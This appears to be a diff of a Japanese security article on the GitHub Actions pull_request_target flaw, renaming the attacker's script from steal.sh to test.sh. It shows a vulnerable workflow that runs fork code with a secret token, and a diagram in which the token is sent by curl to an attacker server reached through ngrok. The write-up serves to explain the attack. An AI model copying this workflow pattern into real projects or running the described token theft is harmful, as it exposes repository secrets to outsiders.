@@ -105,7 +105,7 @@ jobs:
           ref: ${{ github.event.pull_request.head.sha }}
           # ↑ 攻撃者のコードを Runner にダウンロード（ここが問題）
 
-      - run: bash ./steal.sh    # 攻撃者が仕込んだコードが実行される
+      - run: bash ./test.sh    # 攻撃者が仕込んだコードが実行される
         env:
           SECRET_TOKEN: ${{ secrets.SECRET_TOKEN }}
 ```
@@ -129,12 +129,12 @@ pull_request_target                    head.sha での checkout
   │  1. フォーク                                  │
   │ ◄──────────────────────────────────────────  │
   │                                              │
-  │  2. steal.sh を仕込んで PR 送信               │
+  │  2. test.sh を仕込んで PR 送信               │
   │ ──────────────────────────────────────────► │
   │                                              │
   │              3. pull_request_target トリガー  │
   │              4. 攻撃者のコードを checkout      │
-  │              5. steal.sh 実行                │
+  │              5. test.sh 実行                │
   │                 → PAT が環境変数として展開      │
   │                                              │
   │  6. curl で PAT を攻撃者サーバーに送信         │
@@ -155,7 +155,7 @@ pull_request_target                    head.sha での checkout
 - 攻撃者リポジトリ: `kitahara51/vulnerable-actions-test`（フォーク）
 - 受信サーバー: ngrok でローカルに公開
 
-### steal.sh（攻撃者がフォークに仕込むコード）
+### test.sh（攻撃者がフォークに仕込むコード）
 
 ```bash
 #!/bin/bash
